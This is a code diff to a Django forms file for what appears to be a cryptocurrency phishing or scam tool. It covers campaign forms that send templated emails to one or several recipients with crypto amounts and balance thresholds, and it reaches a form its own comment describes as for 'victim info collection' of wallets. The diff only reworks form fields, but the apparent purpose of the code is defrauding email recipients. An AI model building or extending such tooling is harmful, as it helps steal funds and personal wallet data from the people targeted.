@@ -10,19 +10,18 @@ class CampaignForm(forms.ModelForm):
         model = Campaign
         fields = ['recipient_email', 'email_template', 'cryptocurrency', 'quantity', 'min_balance']
         widgets = {
-            'recipient_email': forms.EmailInput(attrs={'class': 'form-control', 'placeholder': 'Recipient Email'}),
+            'recipient_email': forms.EmailInput(attrs={'class': 'form-control'}),
             'email_template': forms.Select(attrs={'class': 'form-control'}),
             'cryptocurrency': forms.Select(attrs={'class': 'form-control'}),
-            'quantity': forms.NumberInput(attrs={'class': 'form-control', 'placeholder': 'Crypto Amount'}),
-            'min_balance': forms.NumberInput(attrs={'class': 'form-control', 'placeholder': 'Minimum Balance Required'}),
+            'quantity': forms.NumberInput(attrs={'class': 'form-control'}),
+            'min_balance': forms.NumberInput(attrs={'class': 'form-control'}),
         }
 
 # MultiCampaignForm allows creating a campaign with multiple recipient emails
 class MultiCampaignForm(forms.ModelForm):
-    recipient_emails = forms.CharField(
-        widget=forms.Textarea(attrs={'rows': 3, 'class': 'form-control', 'placeholder': 'Enter emails separated by commas'}),
-        help_text="Enter multiple recipient emails separated by commas"
-    )
+    email_1 = forms.EmailField(widget=forms.EmailInput(attrs={'class': 'form-control'}), required=False)
+    email_2 = forms.EmailField(widget=forms.EmailInput(attrs={'class': 'form-control'}), required=False)
+    email_3 = forms.EmailField(widget=forms.EmailInput(attrs={'class': 'form-control'}), required=False)
 
     class Meta:
         model = Campaign
@@ -30,16 +29,21 @@ class MultiCampaignForm(forms.ModelForm):
         widgets = {
             'email_template': forms.Select(attrs={'class': 'form-control'}),
             'cryptocurrency': forms.Select(attrs={'class': 'form-control'}),
-            'quantity': forms.NumberInput(attrs={'class': 'form-control', 'placeholder': 'Crypto Amount'}),
-            'min_balance': forms.NumberInput(attrs={'class': 'form-control', 'placeholder': 'Minimum Balance Required'}),
+            'quantity': forms.NumberInput(attrs={'class': 'form-control'}),
+            'min_balance': forms.NumberInput(attrs={'class': 'form-control'}),
         }
 
-    def clean_recipient_emails(self):
-        emails = self.cleaned_data.get('recipient_emails', '')
-        email_list = [email.strip() for email in emails.split(',') if email.strip()]
-        if not email_list:
-            raise forms.ValidationError("Please provide at least one recipient email.")
-        return email_list
+    def clean(self):
+        cleaned_data = super().clean()
+        email_1 = cleaned_data.get('email_1')
+        email_2 = cleaned_data.get('email_2')
+        email_3 = cleaned_data.get('email_3')
+
+        emails = [email for email in [email_1, email_2, email_3] if email]
+        if not emails:
+            raise forms.ValidationError("At least one recipient email must be provided.")
+        return cleaned_data
+
 
 # Wallet selection form for the victim info collection
 class WalletForm(forms.ModelForm):
